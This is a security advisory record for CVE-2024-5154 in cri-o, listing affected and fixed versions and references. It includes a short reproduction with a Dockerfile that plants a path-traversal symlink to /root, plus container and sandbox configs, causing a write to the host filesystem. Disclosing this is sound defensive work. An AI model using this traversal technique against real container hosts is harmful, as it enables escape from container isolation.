---
identifier: "CVE-2024-5154"
identifiers:
- "CVE-2024-5154"
- "GHSA-j9hf-98c3-wrm8"
package_slug: "go/github.com/cri-o/cri-o"
title: "malicious container creates symlink \"mtab\" on the host External"
description: "A malicious container can affect the host by taking advantage of code
  cri-o added to show the container mounts on the host.\n\nA workload built from this
  Dockerfile:\n```\nFROM docker.io/library/busybox as source\nRUN mkdir /extra &&
  cd /extra && ln -s ../../../../../../../../root etc\n\nFROM scratch\n\nCOPY --from=source
  /bin /bin\nCOPY --from=source /lib /lib\nCOPY --from=source /extra .\n\n```\n\nand
  this container config:\n\n```\n{\n\"metadata\": {\n\"name\": \"busybox\"\n},\n\"image\":{\n\"image\":
  \"localhost/test\"\n},\n\"command\": [\n\"/bin/true\"\n],\n\"linux\": {\n}\n}\n\n\n```\nand
  this sandbox config\n```\n{\n\"metadata\": {\n\"name\": \"test-sandbox\",\n\"namespace\":
  \"default\",\n\"attempt\": 1,\n\"uid\": \"edishd83djaideaduwk28bcsb\"\n},\n\"linux\":
  {\n\"security_context\": {\n\"namespace_options\": {\n\"network\": 2\n}\n}\n}\n}\n\n```\n\nwill
  create a file on host `/host/mtab`"
date: "2025-06-27"
pubdate: "2024-06-04"
affected_range: ">=1.28.6 <1.28.7||>=1.29.4 <1.29.5||>=1.30.0 <1.30.1"
fixed_versions:
- "1.28.7"
- "1.29.5"
- "1.30.1"
affected_versions: "All versions starting from 1.28.6 before 1.28.7, all versions
  starting from 1.29.4 before 1.29.5, all versions starting from 1.30.0 before 1.30.1"
not_impacted: "All versions before 1.28.6, all versions starting from 1.28.7 before
  1.29.4, all versions starting from 1.29.5 before 1.30.0, all versions starting from
  1.30.1"
solution: "Upgrade to versions 1.28.7, 1.29.5, 1.30.1 or above."
urls:
- "https://nvd.nist.gov/vuln/detail/CVE-2024-5154"
- "https://github.com/advisories/GHSA-j9hf-98c3-wrm8"
- "https://github.com/cri-o/cri-o/security/advisories/GHSA-j9hf-98c3-wrm8"
- "https://access.redhat.com/errata/RHSA-2024:10818"
- "https://access.redhat.com/errata/RHSA-2024:3676"
- "https://access.redhat.com/errata/RHSA-2024:3700"
- "https://access.redhat.com/errata/RHSA-2024:4008"
- "https://access.redhat.com/errata/RHSA-2024:4159"
- "https://access.redhat.com/errata/RHSA-2024:4486"
- "https://access.redhat.com/security/cve/CVE-2024-5154"
- "https://bugzilla.redhat.com/show_bug.cgi?id=2280190"
- "https://github.com/cri-o/cri-o"
- "https://pkg.go.dev/vuln/GO-2024-2919"
cvss_v3: "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:N"
uuid: "17bdbe5c-3d60-4011-bd0a-560e9c5d25c3"
cwe_ids:
- "CWE-22"
- "CWE-668"
- "CWE-937"
- "CWE-1035"
